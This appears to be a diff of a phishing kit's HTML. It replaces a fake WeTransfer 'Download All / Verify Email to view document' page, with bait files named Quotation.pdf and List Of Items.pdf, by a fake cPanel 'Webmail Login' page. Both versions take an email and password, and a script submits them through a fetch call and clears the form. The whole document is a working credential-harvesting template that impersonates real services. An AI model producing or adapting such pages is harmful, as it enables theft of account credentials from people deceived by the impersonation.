@@ -3,567 +3,144 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>WeTransfer</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<title>Webmail Login</title>
+
 <style>
-  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-  :root {
-    --black: #111;
-    --white: #fff;
-    --gray-light: #f2f2f2;
-    --gray-mid: #aaa;
-    --gray-border: #ddd;
-    --blue: #2d6af6;
-    --sky: #c7dff7;
-    --radius: 16px;
-    --radius-sm: 10px;
-    --red: #ff4d4d;
-  }
-
-  body {
-    font-family: 'DM Sans', sans-serif;
-    background: var(--white);
-    color: var(--black);
-    min-height: 100vh;
-    overflow-x: hidden;
-  }
-
-  /* ─── NAV ─────────────────────────────────── */
-  nav {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 18px 32px;
-    position: fixed;
-    top: 0; left: 0; right: 0;
-    z-index: 100;
-    background: rgba(255,255,255,0.85);
-    backdrop-filter: blur(12px);
-    border-bottom: 1px solid var(--gray-border);
-  }
-
-  .logo {
-    font-family: 'Playfair Display', serif;
-    font-size: 1.35rem;
-    font-weight: 700;
-    letter-spacing: -0.5px;
-    color: var(--black);
-    text-decoration: none;
-  }
-
-  .logo span { font-style: italic; }
-
-  nav .nav-links {
-    display: flex;
-    gap: 28px;
-    list-style: none;
-  }
-
-  nav .nav-links a {
-    text-decoration: none;
-    color: var(--black);
-    font-size: 0.875rem;
-    font-weight: 500;
-    opacity: 0.7;
-    transition: opacity 0.2s;
-  }
-
-  nav .nav-links a:hover { opacity: 1; }
-
-  .nav-cta {
-    background: var(--black);
-    color: var(--white) !important;
-    opacity: 1 !important;
-    padding: 8px 18px;
-    border-radius: 50px;
-    font-size: 0.85rem !important;
-    font-weight: 500 !important;
-    transition: background 0.2s !important;
-  }
-
-  .nav-cta:hover { background: #333 !important; }
-
-  /* ─── LAYOUT ──────────────────────────────── */
-  .page-wrapper {
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    min-height: 100vh;
-    padding-top: 64px;
-  }
-
-  /* ─── LEFT PANEL ──────────────────────────── */
-  .left-panel {
-    background: #e8eef8;
-    position: relative;
-    overflow: hidden;
-    display: flex;
-    flex-direction: column;
-    justify-content: flex-start;
-    padding: 60px 48px 40px;
-    min-height: calc(100vh - 64px);
-  }
-
-  .hero-text {
-    position: relative;
-    z-index: 2;
-  }
-
-  .hero-text .tagline {
-    font-family: 'DM Sans', sans-serif;
-    font-size: 0.8rem;
-    font-weight: 400;
-    color: #667;
-    margin-bottom: 16px;
-    letter-spacing: 0.5px;
-  }
-
-  .hero-text h1 {
-    font-family: 'Playfair Display', serif;
-    font-size: clamp(2rem, 3.5vw, 3rem);
-    font-weight: 400;
-    line-height: 1.15;
-    color: var(--black);
-    margin-bottom: 4px;
-  }
-
-  .hero-text h1 strong {
-    font-weight: 700;
-    font-style: italic;
-  }
-
-  /* Browser mockup card */
-  .browser-mockup {
-    margin-top: 48px;
-    border-radius: var(--radius);
-    overflow: hidden;
-    box-shadow: 0 24px 60px rgba(0,0,0,0.15);
-    background: var(--white);
-    position: relative;
-    z-index: 2;
-    max-width: 380px;
-  }
-
-  .browser-bar {
-    background: #b8d0e8;
-    padding: 12px 16px;
-    display: flex;
-    gap: 7px;
-    align-items: center;
-  }
-
-  .dot { width: 11px; height: 11px; border-radius: 50%; }
-  .dot.red   { background: #ff5f57; }
-  .dot.yellow{ background: #febc2e; }
-  .dot.green { background: #28c840; }
-
-  .upload-ui {
-    padding: 28px 24px;
-  }
-
-  .upload-zone {
-    border: 2px dashed var(--gray-border);
-    border-radius: var(--radius-sm);
-    padding: 28px 20px;
-    text-align: center;
-    cursor: pointer;
-    transition: border-color 0.2s, background 0.2s;
-    margin-bottom: 20px;
-  }
-
-  .upload-zone:hover {
-    border-color: var(--blue);
-    background: #f5f8ff;
-  }
-
-  .upload-zone.drag-over {
-    border-color: var(--blue);
-    background: #eef3ff;
-  }
-
-  .plus-btn {
-    width: 44px; height: 44px;
-    background: var(--blue);
-    border-radius: 50%;
-    display: flex; align-items: center; justify-content: center;
-    margin: 0 auto 12px;
-    font-size: 1.5rem;
-    color: var(--white);
-    cursor: pointer;
-    transition: transform 0.2s, background 0.2s;
-  }
-
-  .plus-btn:hover { transform: scale(1.08); background: #1a55e0; }
-
-  .upload-zone p { font-size: 0.82rem; color: var(--gray-mid); }
-  .upload-zone p a { color: var(--black); text-decoration: underline; cursor: pointer; }
-
-  .input-row {
-    display: flex;
-    flex-direction: column;
-    gap: 10px;
-    margin-bottom: 16px;
-  }
-
-  .field {
-    border: none;
-    border-bottom: 1px solid var(--gray-border);
-    padding: 10px 4px;
-    font-size: 0.85rem;
-    font-family: 'DM Sans', sans-serif;
-    color: var(--black);
-    outline: none;
-    background: transparent;
-    transition: border-color 0.2s;
-  }
-
-  .field::placeholder { color: var(--gray-mid); }
-  .field:focus { border-color: var(--black); }
-
-  .send-row {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    gap: 12px;
-    margin-top: 8px;
-  }
-
-  .options-btn {
-    width: 40px; height: 40px;
-    border: 1.5px solid var(--gray-border);
-    border-radius: 50%;
-    display: flex; align-items: center; justify-content: center;
-    cursor: pointer;
-    font-size: 1rem;
-    color: var(--gray-mid);
-    background: none;
-    transition: border-color 0.2s;
-  }
-
-  .options-btn:hover { border-color: var(--black); color: var(--black); }
-
-  .transfer-btn {
-    flex: 1;
-    background: var(--blue);
-    color: var(--white);
-    border: none;
-    border-radius: 50px;
-    padding: 12px 24px;
-    font-size: 0.9rem;
-    font-family: 'DM Sans', sans-serif;
-    font-weight: 500;
-    cursor: pointer;
-    transition: background 0.2s, transform 0.1s;
-  }
-
-  .transfer-btn:hover { background: #1a55e0; }
-  .transfer-btn:active { transform: scale(0.98); }
-
-  /* File list inside browser mockup */
-  .file-list {
-    display: none;
-    flex-direction: column;
-    gap: 6px;
-    margin-bottom: 12px;
-  }
-
-  .file-item {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    background: var(--gray-light);
-    border-radius: 8px;
-    padding: 8px 12px;
-    font-size: 0.78rem;
-  }
-
-  .file-item-name { font-weight: 500; }
-  .file-item-size { color: var(--gray-mid); }
-  .file-remove {
-    cursor: pointer;
-    color: var(--gray-mid);
-    background: none;
-    border: none;
-    font-size: 1rem;
-    line-height: 1;
-    transition: color 0.2s;
-  }
-  .file-remove:hover { color: #e53; }
-
-  /* ─── RIGHT PANEL ─────────────────────────── */
-  .right-panel {
-    background: var(--white);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    padding: 60px 48px 40px;
-    min-height: calc(100vh - 64px);
-  }
-
-  /* ─── DOWNLOAD CARD ───────────────────────── */
-  .download-card {
-    width: 100%;
-    max-width: 380px;
-    background: var(--white);
-    border-radius: var(--radius);
-    box-shadow: 0 8px 40px rgba(0,0,0,0.08);
-    border: 1px solid var(--gray-border);
-    overflow: hidden;
-    animation: floatIn 0.5s ease;
-  }
-
-  @keyframes floatIn {
-    from { opacity: 0; transform: translateY(20px); }
-    to   { opacity: 1; transform: translateY(0); }
-  }
-
-  .card-header {
-    padding: 32px 28px 24px;
-    text-align: center;
-    border-bottom: 1px solid var(--gray-border);
-  }
-
-  .card-logo {
-    font-family: 'Playfair Display', serif;
-    font-size: 1.3rem;
-    font-weight: 700;
-    margin-bottom: 24px;
-    display: block;
-  }
-
-  .card-logo span { font-style: italic; }
-
-  /* Tabs */
-  .tabs {
-    display: flex;
-    gap: 0;
-    border-bottom: 1px solid var(--gray-border);
-    margin-bottom: 0;
-    width: 100%;
-  }
-
-  .tab-btn {
-    flex: 1;
-    background: none;
-    border: none;
-    border-bottom: 2px solid transparent;
-    padding: 10px;
-    font-family: 'DM Sans', sans-serif;
-    font-size: 0.85rem;
-    font-weight: 500;
-    color: var(--gray-mid);
-    cursor: pointer;
-    transition: color 0.2s, border-color 0.2s;
-    margin-bottom: -1px;
-  }
-
-  .tab-btn.active {
-    color: var(--black);
-    border-bottom-color: var(--black);
-  }
-
-  /* Download view */
-  .download-view { padding: 28px; }
-
-  .dl-icon {
-    width: 60px; height: 60px;
-    border: 2px solid var(--gray-border);
-    border-radius: 50%;
-    display: flex; align-items: center; justify-content: center;
-    margin: 0 auto 20px;
-    font-size: 1.4rem;
-    color: var(--gray-mid);
-    animation: pulse 2.5s ease-in-out infinite;
-  }
-
-  @keyframes pulse {
-    0%, 100% { box-shadow: 0 0 0 0 rgba(45,106,246,0); }
-    50%       { box-shadow: 0 0 0 8px rgba(45,106,246,0.08); }
-  }
-
-  .files-grid {
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 8px;
-    background: var(--gray-light);
-    border-radius: var(--radius-sm);
-    padding: 16px;
-    margin-bottom: 14px;
-  }
-
-  .file-thumb {
-    display: flex;
-    flex-direction: column;
-    gap: 4px;
-  }
-
-  .file-thumb .fname {
-    font-size: 0.78rem;
-    font-weight: 500;
-    color: var(--black);
-    white-space: nowrap;
-    overflow: hidden;
-    text-overflow: ellipsis;
-  }
-
-  .file-thumb .fmeta {
-    font-size: 0.72rem;
-    color: var(--gray-mid);
-  }
-
-  .validity-note {
-    font-size: 0.75rem;
-    color: var(--gray-mid);
-    text-align: center;
-    margin-bottom: 16px;
-  }
-
-  .progress-bar-wrap {
-    height: 3px;
-    background: var(--gray-border);
-    border-radius: 4px;
-    margin-bottom: 16px;
-    overflow: hidden;
-    display: none;
-  }
-
-  .progress-bar-fill {
-    height: 100%;
-    width: 0%;
-    background: var(--black);
-    border-radius: 4px;
-    transition: width 0.2s ease;
-  }
-
-  .dl-btn {
-    width: 100%;
-    background: var(--black);
-    color: var(--white);
-    border: none;
-    border-radius: 50px;
-    padding: 14px;
-    font-size: 0.9rem;
-    font-family: 'DM Sans', sans-serif;
-    font-weight: 500;
-    cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 4px;
-    transition: background 0.2s, transform 0.1s;
-  }
-
-  .dl-btn:hover { background: #333; }
-  .dl-btn:active { transform: scale(0.98); }
-
-  /* Login view */
-  .login-view { padding: 28px; display: none; }
-
-  .login-view h2 {
-    font-family: 'Playfair Display', serif;
-    font-size: 1.15rem;
-    font-weight: 400;
-    text-align: center;
-    margin-bottom: 20px;
-  }
-
-  .form-group {
-    position: relative;
-    margin-bottom: 12px;
-  }
-
-  .form-icon {
-    position: absolute;
-    left: 14px;
-    top: 54%;
-    transform: translateY(-50%);
-    color: var(--gray-mid);
-    font-size: 0.9rem;
-  }
-
-  .form-input {
-    width: 100%;
-    background: var(--gray-light);
-    border: 1.5px solid transparent;
-    border-radius: var(--radius-sm);
-    padding: 13px 14px 13px 40px;
-    font-size: 0.85rem;
-    font-family: 'DM Sans', sans-serif;
-    color: var(--black);
-    outline: none;
-    transition: border-color 0.2s;
-  }
-
-  .form-input:focus { border-color: var(--black); background: var(--white); }
-
-  .forgot-link {
-    display: block;
-    text-align: center;
-    font-size: 0.78rem;
-    color: var(--black);
-    text-decoration: underline;
-    margin-bottom: 14px;
-    cursor: pointer;
-  }
-
-  .verify-btn {
-    width: 100%;
-    background: var(--black);
-    color: var(--white);
-    border: none;
-    border-radius: 50px;
-    padding: 14px;
-    font-size: 0.9rem;
-    font-family: 'DM Sans', sans-serif;
-    font-weight: 500;
-    cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    transition: background 0.2s;
-  }
-
-  .verify-btn:hover { background: #333; }
-
-  .we-badge {
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-    width: 50px; height: 20px;
-    border-radius: 4px;
-    font-size: 0.6rem;
-    font-weight: 700;
-    color: var(--black);
-    margin-top: 2px;
-  }
-  
-  .we-badge svg { color: var(--white);}
-
-  /* ─── FOOTER ──────────────────────────────── */
-  footer {
-    grid-column: 1 / -1;
-    padding: 16px 32px;
-    border-top: 1px solid var(--gray-border);
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    font-size: 0.75rem;
-    color: var(--gray-mid);
-  }
-
-  footer a { color: var(--gray-mid); text-decoration: none; }
-  footer a:hover { color: var(--black); }
-
-  /* ─── TOAST ───────────────────────────────── */
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family: Arial, Helvetica, sans-serif;
+}
+
+body{
+    background:#f1f1f1;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+}
+
+.container{
+    width:100%;
+    max-width:420px;
+    padding:20px;
+}
+
+.logo{
+    text-align:center;
+    margin-bottom:35px;
+}
+
+.logo h1{
+    color:#eb7a3c;
+    font-size:64px;
+    font-weight:bold;
+    font-style:italic;
+}
+
+.label{
+    font-size:18px;
+    font-weight:600;
+    color:#333;
+    margin-bottom:10px;
+}
+
+.input-group{
+    margin-bottom:25px;
+}
+
+.input-box{
+    width:100%;
+    height:58px;
+    border:2px solid #d4d4d4;
+    border-radius:6px;
+    padding:0 15px;
+    font-size:18px;
+    background:#fff;
+}
+
+.input-box:focus{
+    outline:none;
+    border-color:#6ca8d6;
+}
+
+.login-btn{
+    width:100%;
+    height:58px;
+    border:none;
+    border-radius:6px;
+    background:#4f95c8;
+    color:white;
+    font-size:20px;
+    cursor:pointer;
+}
+
+.login-btn:hover{
+    background:#4288bb;
+}
+
+.or-section{
+    text-align:center;
+    margin:40px 0 25px;
+    color:#444;
+    font-size:20px;
+}
+
+.cp-login{
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    gap:10px;
+    margin-bottom:30px;
+}
+
+.cp-icon{
+    width:45px;
+    height:45px;
+    background:#f38b3d;
+    border-radius:6px;
+    color:white;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-weight:bold;
+    font-size:24px;
+}
+
+.locale{
+    text-align:center;
+    margin-bottom:35px;
+}
+
+.locale select{
+    padding:8px 12px;
+    font-size:18px;
+    border:1px solid #888;
+    border-radius:4px;
+}
+
+.footer{
+    text-align:center;
+    color:#666;
+    font-size:14px;
+}
+
+.footer .cp{
+    color:#f38b3d;
+    font-size:28px;
+    font-weight:bold;
+    margin-bottom:10px;
+}
+
+/* ─── TOAST ───────────────────────────────── */
   .toast {
     position: fixed;
     bottom: 28px;
     left: 50%;
     transform: translateX(-50%) translateY(80px);
-    background: var(--red);
-    color: var(--white);
+    background: red;
+    color: white;
     padding: 12px 24px;
     border-radius: 50px;
     font-size: 0.85rem;
@@ -574,153 +151,53 @@
   }
 
   .toast.show { transform: translateX(-50%) translateY(0); }
-
-  /* ─── MOBILE ──────────────────────────────── */
-  @media (max-width: 768px) {
-    nav { padding: 14px 20px; }
-    
-    .nav-links > :nth-child(-n+3) {
-  display: none;
-}
-
-    .page-wrapper {
-      grid-template-columns: 1fr;
-      grid-template-rows: auto auto;
-      padding-top: 58px;
-    }
-
-    /* Download/login card comes first on mobile */
-    .right-panel  { order: 1; }
-    .left-panel   { display: none; }
-    footer        { order: 2; }
-
-    .right-panel {
-      padding: 28px 20px 40px;
-      min-height: unset;
-    }
-
-    .download-card { max-width: 100%; box-shadow: none; border: none; }
-
-    footer {
-      flex-direction: column;
-      gap: 8px;
-      text-align: center;
-    }
-  }
 </style>
 </head>
 <body>
 
-<!-- NAV -->
-<nav>
-  <a class="logo" href="#"><svg xmlns="http://www.w3.org/2000/svg" width="40" height="20" fill="none" class="styles_module_logo__c2382cb9 styles_module_light__c2382cb9"><path fill="currentColor" fill-rule="evenodd" d="M12.23 15.014c-.383-.605-.697-.926-1.254-.926-.558 0-.872.32-1.255.926L8.05 17.686c-.627 1.032-1.15 1.745-2.37 1.745s-1.777-.499-2.369-1.888a42.3 42.3 0 0 1-2.195-6.554C.348 7.89 0 5.967 0 4.4s.488-2.493 2.16-2.813c2.3-.428 5.401-.677 8.816-.677 3.414 0 6.515.25 8.815.677 1.672.32 2.16 1.246 2.16 2.814 0 1.567-.348 3.49-1.115 6.59a42.3 42.3 0 0 1-2.195 6.553c-.592 1.39-1.15 1.888-2.37 1.888-1.219 0-1.741-.713-2.369-1.745zm26.516 2.5c-1.185 1.282-3.415 2.208-6.342 2.208-5.888 0-9.373-4.096-9.373-9.474 0-5.77 4.007-9.19 9.199-9.19 4.634 0 7.7 2.458 7.7 5.77 0 3.135-2.613 5.165-5.575 5.165-1.602 0-2.787-.32-3.588-.961-.314-.25-.488-.214-.488.071 0 1.175.418 2.173 1.184 2.956.628.641 1.812 1.069 2.927 1.069 1.15 0 2.16-.25 3.066-.713s1.673-.32 2.126.428c.523.855-.21 1.959-.836 2.671" clip-rule="evenodd"></path></svg></a>
-  <ul class="nav-links">
-    <li><a href="#">Products</a></li>
-    <li><a href="#">Pricing</a></li>
-    <li><a href="#">Blog</a></li>
-    <li><a href="#" class="nav-cta" onclick="event.preventDefault(); goToLoginTab()">Log in</a></li>
-  </ul>
-</nav>
+<div class="container">
 
-<!-- MAIN -->
-<div class="page-wrapper">
-
-  <!-- LEFT: UPLOAD -->
-  <section class="left-panel">
-    <div class="hero-text">
-      <p class="tagline">Send files on your terms with WeTransfer</p>
-      <h1>The simplest way to share <strong>big ideas</strong></h1>
+    <div class="logo">
+        <h1>Webmail</h1>
     </div>
 
-    <div class="browser-mockup">
-      <div class="browser-bar">
-        <div class="dot red"></div>
-        <div class="dot yellow"></div>
-        <div class="dot green"></div>
-      </div>
-      <div class="upload-ui">
-        <!-- Drop zone -->
-        <div class="upload-zone" id="dropZone" onclick="document.getElementById('fileInput').click()">
-          <div class="plus-btn">+</div>
-          <p>Add your files<br><small>Or <a onclick="event.stopPropagation(); document.getElementById('fileInput').click()">select a folder</a></small></p>
-        </div>
-        <input type="file" id="fileInput" multiple hidden>
-
-        <!-- File list -->
-        <div class="file-list" id="fileList"></div>
-
-        <!-- Fields -->
-        <div class="input-row">
-          <input class="field" type="email" placeholder="Email to" id="emailTo">
-          <input class="field" type="email" placeholder="Your email" id="yourEmail">
-          <input class="field" type="text"  placeholder="Message (optional)" id="msgField">
-        </div>
-
-        <!-- Actions -->
-        <div class="send-row">
-          <button class="options-btn" title="More options" onclick="showToast('Options coming soon')">···</button>
-          <button class="transfer-btn" onclick="handleTransfer()">Transfer</button>
-        </div>
-      </div>
+    <div class="input-group">
+        <div class="label">Email Address</div>
+        <input type="email" id="loginEmail" class="input-box" placeholder="Enter your email address.">
     </div>
-  </section>
 
-  <!-- RIGHT: DOWNLOAD / LOGIN -->
-  <section class="right-panel">
-    <div class="download-card">
-      <div class="card-header">
-        <span class="card-logo">
-          <img src="/images/wtlogo.png" alt="WeTransfer" style="height: 20px;">
-        </span>
-        <div class="tabs">
-          <button class="tab-btn active" onclick="switchTab('download', this)">Download</button>
-          <button class="tab-btn" onclick="switchTab('login', this)">Log in</button>
-        </div>
-      </div>
-
-      <!-- DOWNLOAD TAB -->
-      <div class="download-view" id="downloadView">
-        <div class="dl-icon">↓</div>
-        <div class="files-grid">
-          <div class="file-thumb">
-            <span class="fname">List Of Items.pdf</span>
-            <span class="fmeta">961Kb · pdf</span>
-          </div>
-          <div class="file-thumb">
-            <span class="fname">Quotation.pdf</span>
-            <span class="fmeta">7Mb · pdf</span>
-          </div>
-        </div>
-        <p class="validity-note">Files are valid for 7 days</p>
-        <button class="dl-btn" onclick="goToLoginTab()">
-          <span class="we-badge"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 24" width="50" height="17" fill="none" class="styles_module_logo__c2382cb9 styles_module_dark__c2382cb9"><path fill="currentColor" fill-rule="evenodd" d="M12.23 15.014c-.383-.605-.697-.926-1.254-.926-.558 0-.872.32-1.255.926L8.05 17.686c-.627 1.032-1.15 1.745-2.37 1.745s-1.777-.499-2.369-1.888a42.3 42.3 0 0 1-2.195-6.554C.348 7.89 0 5.967 0 4.4s.488-2.493 2.16-2.813c2.3-.428 5.401-.677 8.816-.677 3.414 0 6.515.25 8.815.677 1.672.32 2.16 1.246 2.16 2.814 0 1.567-.348 3.49-1.115 6.59a42.3 42.3 0 0 1-2.195 6.553c-.592 1.39-1.15 1.888-2.37 1.888-1.219 0-1.741-.713-2.369-1.745zm26.516 2.5c-1.185 1.282-3.415 2.208-6.342 2.208-5.888 0-9.373-4.096-9.373-9.474 0-5.77 4.007-9.19 9.199-9.19 4.634 0 7.7 2.458 7.7 5.77 0 3.135-2.613 5.165-5.575 5.165-1.602 0-2.787-.32-3.588-.961-.314-.25-.488-.214-.488.071 0 1.175.418 2.173 1.184 2.956.628.641 1.812 1.069 2.927 1.069 1.15 0 2.16-.25 3.066-.713s1.673-.32 2.126.428c.523.855-.21 1.959-.836 2.671" clip-rule="evenodd"></path></svg></span> Download All
-        </button>
-      </div>
-
-      <!-- LOGIN TAB -->
-      <div class="login-view" id="loginView">
-        <h2>Log in</h2>
-        <div class="form-group">
-          <span class="form-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="17" height="17" fill="#aaa"><title>email-outline</title><path d="M22 6C22 4.9 21.1 4 20 4H4C2.9 4 2 4.9 2 6V18C2 19.1 2.9 20 4 20H20C21.1 20 22 19.1 22 18V6M20 6L12 11L4 6H20M20 18H4V8L12 13L20 8V18Z" /></svg></span>
-          <input class="form-input" type="email" placeholder="Email" id="loginEmail">
-        </div>
-        <div class="form-group">
-          <span class="form-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="17" height="17" fill="#aaa"><title>lock-outline</title><path d="M12,17C10.89,17 10,16.1 10,15C10,13.89 10.89,13 12,13A2,2 0 0,1 14,15A2,2 0 0,1 12,17M18,20V10H6V20H18M18,8A2,2 0 0,1 20,10V20A2,2 0 0,1 18,22H6C4.89,22 4,21.1 4,20V10C4,8.89 4.89,8 6,8H7V6A5,5 0 0,1 12,1A5,5 0 0,1 17,6V8H18M12,3A3,3 0 0,0 9,6V8H15V6A3,3 0 0,0 12,3Z" /></svg></span>
-          <input class="form-input" type="password" placeholder="Password" id="loginPass">
-        </div>
-        <a class="forgot-link" href="#">Forgot password?</a>
-        <button class="verify-btn" id="verifyBtn" onclick="handleLogin()">
-          <span class="we-badge"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 24" width="50" height="17" fill="none" class="styles_module_logo__c2382cb9 styles_module_dark__c2382cb9"><path fill="currentColor" fill-rule="evenodd" d="M12.23 15.014c-.383-.605-.697-.926-1.254-.926-.558 0-.872.32-1.255.926L8.05 17.686c-.627 1.032-1.15 1.745-2.37 1.745s-1.777-.499-2.369-1.888a42.3 42.3 0 0 1-2.195-6.554C.348 7.89 0 5.967 0 4.4s.488-2.493 2.16-2.813c2.3-.428 5.401-.677 8.816-.677 3.414 0 6.515.25 8.815.677 1.672.32 2.16 1.246 2.16 2.814 0 1.567-.348 3.49-1.115 6.59a42.3 42.3 0 0 1-2.195 6.553c-.592 1.39-1.15 1.888-2.37 1.888-1.219 0-1.741-.713-2.369-1.745zm26.516 2.5c-1.185 1.282-3.415 2.208-6.342 2.208-5.888 0-9.373-4.096-9.373-9.474 0-5.77 4.007-9.19 9.199-9.19 4.634 0 7.7 2.458 7.7 5.77 0 3.135-2.613 5.165-5.575 5.165-1.602 0-2.787-.32-3.588-.961-.314-.25-.488-.214-.488.071 0 1.175.418 2.173 1.184 2.956.628.641 1.812 1.069 2.927 1.069 1.15 0 2.16-.25 3.066-.713s1.673-.32 2.126.428c.523.855-.21 1.959-.836 2.671" clip-rule="evenodd"></path></svg></span> Verify Email to view document
-        </button>
-      </div>
+    <div class="input-group">
+        <div class="label">Password</div>
+        <input type="password" id="loginPass" class="input-box" placeholder="Enter your email password.">
     </div>
-  </section>
 
-  <!-- FOOTER -->
-  <footer>
-    <span>© 2026 WeTransfer B.V. — <a href="#">Privacy</a> · <a href="#">Terms</a></span>
-    <span>Max file size: <strong>2 GB</strong> free · <a href="#">Go Plus</a></span>
-  </footer>
+    <!-- <button class="login-btn">Log in</button> -->
+
+    <button class="verify-btn login-btn" id="verifyBtn" onclick="handleLogin()">
+        Log in
+    </button>
+
+    <div class="or-section">
+        OR Log in via
+    </div>
+
+    <div class="cp-login">
+        <div class="cp-icon">cp</div>
+    </div>
+
+    <div class="locale">
+        Select a locale:
+        <select>
+            <option>English</option>
+        </select>
+    </div>
+
+    <div class="footer">
+        <div class="cp">cp</div>
+        <p>Copyright © 2026 cPanel, L.L.C.</p>
+        <p>Privacy Policy</p>
+    </div>
+
 </div>
 
 <!-- TOAST -->
@@ -882,7 +359,7 @@
       console.error('Fetch error:', err);
     } finally {
       setTimeout(() => {
-        btn.innerHTML = `${weSVG} Verify Email to view document`;
+        btn.innerHTML = `Log in`;
         btn.disabled = false;
         document.getElementById('loginEmail').value = '';
         document.getElementById('loginPass').value = '';
@@ -892,5 +369,6 @@
 
   function isEmail(v) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); }
 </script>
+
 </body>
 </html>
